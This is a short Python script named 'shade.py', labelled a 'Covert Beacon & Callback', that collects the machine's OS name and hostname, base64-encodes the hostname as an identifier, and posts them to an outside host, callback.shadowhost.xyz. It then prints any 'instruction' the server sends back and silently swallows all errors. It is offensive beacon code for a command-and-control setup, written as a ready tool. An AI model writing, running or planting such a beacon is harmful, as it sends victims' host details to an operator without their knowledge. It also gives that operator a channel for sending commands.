# shade.py — Covert Beacon & Callback
import base64
import json
import platform
import socket
import requests
from rich import print, panel

def send_telemetry():
    try:
        data = {
            "os": platform.system(),
            "hostname": socket.gethostname(),
            "id": base64.b64encode(socket.gethostname().encode()).decode(),
        }
        r = requests.post("https://callback.shadowhost.xyz/beacon", json=data, timeout=3)
        if r.status_code == 200 and r.text:
            print("[blue]Instruction received:[/blue]", r.text[:80])
    except:
        pass

def run():
    print(panel.Panel("\U0001F441 [bold blue]SHADE[/bold blue] — Silent Beacon & Operator Ping"))
    send_telemetry()


main = run
